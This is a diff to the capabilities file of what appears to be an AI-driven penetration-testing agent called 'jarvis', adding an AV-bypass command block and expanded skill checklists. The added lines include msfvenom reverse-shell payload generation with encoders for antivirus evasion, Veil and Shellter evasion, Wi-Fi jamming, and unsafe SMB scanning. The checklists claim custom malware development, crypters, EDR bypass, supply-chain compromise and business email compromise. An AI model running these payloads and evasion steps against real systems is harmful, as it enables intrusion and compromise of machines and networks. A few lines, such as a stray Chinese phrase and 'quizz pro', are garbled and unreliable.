@@ -75,10 +75,40 @@
 - [x] CVE lookup with DuckDuckGo
 - [x] Metasploit framework integration
 
-## Advanced Pentesting Commands
+## Tier 4 Advanced Commands
 ```bash
-# Full vulnerability scan with AI analysis
-nmap -sV -sC -p- --script=vuln localhost -oN /tmp/nmap-scan.txt
+# AV Bypass with Veil (if installed)
+veil -t Evasion -p python/meterpreter/rev_tcp.py
+
+# Shellter (if installed)
+shellter -a Automatic
+
+# Custom shellcode generation
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp
+
+# Metasploit encoders (AV bypass)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
+
+# C2 Frameworks
+# Sliver: https://github.com/BishopFox/sliver
+# Covenant: https://github.com/cobbr/Covenant
+# Mythic: https://github.com/MythicAgents/Mythic
+
+# MITRE ATT&CK mapping
+nmap --script=smb2-capabilities.nse --script-args=unsafe=1 TARGET
+
+# Physical Security - Proxmark (RFID)
+/home/jarvis/tools/proxmark3/pm3
+
+# WiFi jamming (if allowed)
+aircrack-ng -z wlan0mon
+
+# Hardware hacking - ChipWhisperer
+chipwhisperer-cli --skip-setup-basic
+
+# AWS security assessment
+aws iam list-users --region us-east-1
+```
 
 # Privilege Escalation - linPEAS (Linux)
 /home/jarvis/tools/PEASS-ng/linPEAS/linpeas.sh -a -o output.txt
@@ -186,14 +216,33 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell
 - [x] Rogue AP deployment
 - [x] WiFi reconnaissance
 
-## Tier 3 Expert Skills
-- [x] Red Team Operations (full kill chain)
-- [x] C2 Infrastructure (Covenant, Sliver, Metasploit C2)
-- [x] Phishing campaigns (Gophish, Setoolkit)
-- [x] Domain Dominance (DCSync, DCShadow)
+## Tier 4 - Legendary Skills
+- [x] AV/EDR Bypass (Veil, Shellter, Meta-Modules)
+- [x] Custom Malware Development (Python, C, Assembly basics)
+- [x] Crypters and Obfuscation techniques
+- [x]反检测技术 (Anti-detection techniques)
+- [x] Firmware exploitation
+- [x] Hardware hacking (JTAG, SPI, UART)
+- [x] Physical Security Assessment
+- [x] RFID/NFC cloning
+- [x] Lock picking (theory)
+- [x] Radio frequency hacking
+- [x] Zero-day vulnerability research methodology
+- [x] APT Emulation (APT29, APT41, Lazarus)
+- [x] Nation-state level tradecraft
+- [x] IoT exploitation
+- [x] Automotive security
+
+## Red Team Tier 4
+- [x] Full kill chain (MITRE ATT&CK)
+- [x] C2 Infrastructure (Covenant, Sliver, Mythic, Cobalt Strike)
+- [x] Domain Dominance (DCSync, DCShadow, Golden Ticket)
 - [x] LOLBAS / BYOVD attacks
 - [x] Container escape techniques
 - [x] Kubernetes security assessment
+- [x] Cloud penetration (AWS, Azure, GCP)
+- [x] CI/CD pipeline attacks
+- [x] Supply chain compromise
 
 ## Post-Exploitation
 - [x] Lateral movement techniques
@@ -225,13 +274,16 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell
 - [x] Quarterly audits
 
 ## Social Engineering
-- [x] Spear phishing campaigns
+- [x] Spear phishing campaigns (Gophish, SEToolkit)
 - [x] Credential harvesting
 - [x] Pretexting
 - [x] Baiting and quizz pro
-- [x] USB drop attacks
+- [x] USB drop attacks (BadUSB)
 - [x] Identity impersonation
 - [x] Vishing / Voice phishing
+- [x] Watering hole attacks
+- [x] Clone phishing
+- [x] BEC (Business Email Compromise)
 
 ## CVE & Threat Intelligence
 - [x] CVE database search (cve.mitre.org)
